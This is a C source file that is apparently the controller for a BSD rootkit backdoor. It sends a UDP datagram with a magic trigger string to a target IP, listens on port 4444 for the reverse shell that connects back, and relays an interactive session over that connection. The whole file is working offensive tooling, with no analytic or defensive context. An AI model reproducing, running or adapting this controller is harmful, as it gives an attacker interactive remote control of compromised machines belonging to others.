#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/select.h>

#define TRIGGER_STRING "BSD_rootkit_REMOTE_MAGIC_TRIGGER_v1"
#define DEFAULT_PORT   4444

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_ip> [port]\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int port = (argc >= 3) ? atoi(argv[2]) : DEFAULT_PORT;

    /* 1. Create and bind TCP listener socket on $REMOTE */
    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd < 0) {
        perror("socket (TCP listen)");
        return 1;
    }

    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in bind_addr;
    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port = htons(port);

    if (bind(listen_fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("bind (TCP listener)");
        close(listen_fd);
        return 1;
    }

    if (listen(listen_fd, 1) < 0) {
        perror("listen");
        close(listen_fd);
        return 1;
    }

    printf("[*] Listener bound to 0.0.0.0:%d. Waiting for connection from %s...\n", port, target_ip);

    /* 2. Send UDP trigger datagram to $TARGET_IP */
    int udp_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_fd >= 0) {
        struct sockaddr_in target_addr;
        memset(&target_addr, 0, sizeof(target_addr));
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(port);
        inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

        sendto(udp_fd, TRIGGER_STRING, strlen(TRIGGER_STRING), 0,
               (struct sockaddr *)&target_addr, sizeof(target_addr));
        printf("[*] Sent UDP trigger datagram to %s:%d\n", target_ip, port);
        close(udp_fd);
    } else {
        perror("socket (UDP trigger)");
    }

    /* 3. Accept incoming TCP reverse connection */
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    int conn_fd = accept(listen_fd, (struct sockaddr *)&client_addr, &client_len);
    if (conn_fd < 0) {
        perror("accept");
        close(listen_fd);
        return 1;
    }

    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
    printf("[+] Reverse shell connected from %s:%d!\n\n", client_ip, ntohs(client_addr.sin_port));

    /* 4. Interactive loop bridging stdin/stdout <-> TCP socket */
    fd_set fds;
    char buf[1024];

    while (1) {
        FD_ZERO(&fds);
        FD_SET(STDIN_FILENO, &fds);
        FD_SET(conn_fd, &fds);

        int max_fd = (conn_fd > STDIN_FILENO) ? conn_fd : STDIN_FILENO;
        if (select(max_fd + 1, &fds, NULL, NULL, NULL) < 0)
            break;

        if (FD_ISSET(STDIN_FILENO, &fds)) {
            ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
            if (n <= 0) break;
            if (write(conn_fd, buf, n) < 0) break;
        }

        if (FD_ISSET(conn_fd, &fds)) {
            ssize_t n = read(conn_fd, buf, sizeof(buf));
            if (n <= 0) break;
            if (write(STDOUT_FILENO, buf, n) < 0) break;
        }
    }

    close(conn_fd);
    close(listen_fd);
    printf("\n[*] Connection closed.\n");
    return 0;
}
